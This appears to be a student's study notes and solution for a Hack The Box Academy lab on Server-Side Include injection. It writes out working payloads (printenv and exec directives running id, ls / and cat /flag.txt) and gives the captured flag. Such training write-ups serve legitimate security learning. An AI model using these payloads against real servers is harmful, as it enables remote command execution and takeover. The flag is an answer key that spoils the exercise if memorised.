---
sticker: lucide//server-off
---
Now that we have discussed how SSI works in the previous section, let us discuss how to exploit SSI injection.

---

## Exploitation

Let us take a look at our sample web application. We are greeted by a simple form asking for our name:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/145/ssi/ssi_1.png)

If we enter our name, we are redirected toÂ `/page.shtml`, which displays some general information:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/145/ssi/ssi_2.png)

We can guess that theÂ page supports SSI based on the file extension.Â If our username is inserted into the page without prior sanitization, it might be vulnerable to SSI injection. Let us confirm this by providing a username ofÂ `<!--#printenv -->`. This results in the following page:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/145/ssi/ssi_3.png)

As we can see, the directive is executed, and the environment variables are printed. Thus, we have successfully confirmed an SSI injection vulnerability. Let us confirm that we can execute arbitrary commands using theÂ `exec`Â directive by providing the following username:Â `<!--#exec cmd="id" -->`



Â Â Â 

![](https://academy.hackthebox.com/storage/modules/145/ssi/ssi_4.png)

The server successfully executed our injected command.Â ThisÂ enables us to take over the web server fully.

# Question

![Pasted image 20250212142109.png](../../../../IMAGES/Pasted%20image%2020250212142109.png)

We can use the following payload to achieve RCE:

```
<!--#exec cmd="id" -->
```

![Pasted image 20250212142217.png](../../../../IMAGES/Pasted%20image%2020250212142217.png)

Nice, let's read `/` directory:

```
<!--#exec cmd="ls /" -->
```

![Pasted image 20250212142245.png](../../../../IMAGES/Pasted%20image%2020250212142245.png)

Found our flag, let's read it:

```
<!--#exec cmd="cat /flag.txt" -->
```

![Pasted image 20250212142315.png](../../../../IMAGES/Pasted%20image%2020250212142315.png)

Flag is:

```
HTB{81e5d8e80eec8e961a31229e4a5e737e}
```
